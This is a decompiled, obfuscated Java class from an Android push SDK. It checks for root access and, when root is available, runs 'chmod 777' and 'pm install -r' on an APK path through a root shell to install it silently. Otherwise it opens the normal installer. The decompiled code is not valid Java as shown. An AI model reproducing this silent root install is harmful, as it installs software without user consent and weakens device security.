package com.push2.sdk.util;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import java.io.File;
import java.io.PrintWriter;

public class o
{
  private static boolean a()
  {
    Object localObject3 = null;
    Object localObject1 = null;
    try
    {
      Process localProcess = Runtime.getRuntime().exec("su");
      localObject1 = localProcess;
      localObject3 = localProcess;
      PrintWriter localPrintWriter = new PrintWriter(localProcess.getOutputStream());
      localObject1 = localProcess;
      localObject3 = localProcess;
      localPrintWriter.flush();
      localObject1 = localProcess;
      localObject3 = localProcess;
      localPrintWriter.close();
      localObject1 = localProcess;
      localObject3 = localProcess;
      boolean bool = a(localProcess.waitFor());
      return bool;
    }
    catch (Exception localException)
    {
      localObject3 = localObject1;
      localException.printStackTrace();
      return false;
    }
    finally
    {
      if (localObject3 != null) {
        localObject3.destroy();
      }
    }
  }
  
  private static boolean a(int paramInt)
  {
    if (paramInt == 0) {
      return true;
    }
    return paramInt != 1;
  }
  
  private static boolean a(String paramString)
  {
    Object localObject2 = null;
    Object localObject1 = null;
    try
    {
      Process localProcess = Runtime.getRuntime().exec("su");
      localObject1 = localProcess;
      localObject2 = localProcess;
      PrintWriter localPrintWriter = new PrintWriter(localProcess.getOutputStream());
      localObject1 = localProcess;
      localObject2 = localProcess;
      localPrintWriter.println("chmod 777 " + paramString);
      localObject1 = localProcess;
      localObject2 = localProcess;
      localPrintWriter.println("export LD_LIBRARY_PATH=/vendor/lib:/system/lib");
      localObject1 = localProcess;
      localObject2 = localProcess;
      localPrintWriter.println("pm install -r " + paramString);
      localObject1 = localProcess;
      localObject2 = localProcess;
      localPrintWriter.flush();
      localObject1 = localProcess;
      localObject2 = localProcess;
      localPrintWriter.close();
      localObject1 = localProcess;
      localObject2 = localProcess;
      boolean bool = a(localProcess.waitFor());
      return bool;
    }
    catch (Exception paramString)
    {
      localObject2 = localObject1;
      paramString.printStackTrace();
      return false;
    }
    finally
    {
      if (localObject2 != null) {
        localObject2.destroy();
      }
    }
  }
  
  public static boolean a(String paramString, Context paramContext)
  {
    if (a()) {
      return a(paramString);
    }
    paramString = new File(paramString);
    if (!paramString.exists()) {
      return false;
    }
    Intent localIntent = new Intent();
    localIntent.setAction("android.intent.action.VIEW");
    localIntent.addCategory("android.intent.category.DEFAULT");
    localIntent.setFlags(268435456);
    localIntent.setDataAndType(Uri.fromFile(paramString), "application/vnd.android.package-archive");
    paramContext.startActivity(localIntent);
    return true;
  }
}
